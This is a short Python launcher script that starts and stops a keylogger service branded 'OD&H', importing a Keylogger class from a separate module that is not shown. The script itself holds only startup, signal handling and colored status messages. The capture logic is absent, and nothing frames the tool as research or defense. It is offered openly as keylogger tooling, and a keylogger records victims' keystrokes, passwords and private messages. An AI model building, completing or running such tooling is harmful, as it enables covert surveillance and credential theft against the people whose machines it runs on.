import signal
import sys
from termcolor import colored
from keylogger import Keylogger

def handle_exit(sig, frame):
    print(colored("\n[!] OD&H - Keylogger service stopped.\n", "red"))
    try:
        keylogger.shutdown()
    except Exception as e:
        print(colored(f"[ERROR] OD&H - Error during shutdown: {e}", "red"))
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)

if __name__ == "__main__":
    print(colored("[+] OD&H - Starting keylogger service...", "green"))
    try:
        keylogger = Keylogger()
        keylogger.start()
    except Exception as e:
        print(colored(f"[ERROR] OD&H - Failed to start keylogger: {e}", "red"))
        sys.exit(1)
